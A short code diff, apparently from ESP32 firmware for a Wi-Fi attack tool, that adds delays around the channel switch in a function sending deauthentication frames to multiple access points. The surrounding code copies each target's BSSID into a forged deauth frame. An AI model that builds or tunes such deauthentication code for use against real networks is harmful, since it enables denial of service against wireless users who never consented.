@@ -1767,8 +1767,9 @@ void wsl_bypasser_send_deauth_frame_multiple_aps(wifi_ap_record_t *ap_records, s
                 ap_record->ssid, ap_record->primary,
                 ap_record->bssid[0], ap_record->bssid[1], ap_record->bssid[2],
                 ap_record->bssid[3], ap_record->bssid[4], ap_record->bssid[5]);
-        
+        vTaskDelay(pdMS_TO_TICKS(100)); // Short delay to ensure channel switch
         esp_wifi_set_channel(ap_record->primary, WIFI_SECOND_CHAN_NONE );
+        vTaskDelay(pdMS_TO_TICKS(100)); // Short delay to ensure channel switch
         uint8_t deauth_frame[sizeof(deauth_frame_default)];
         memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
         memcpy(&deauth_frame[10], ap_record->bssid, 6);
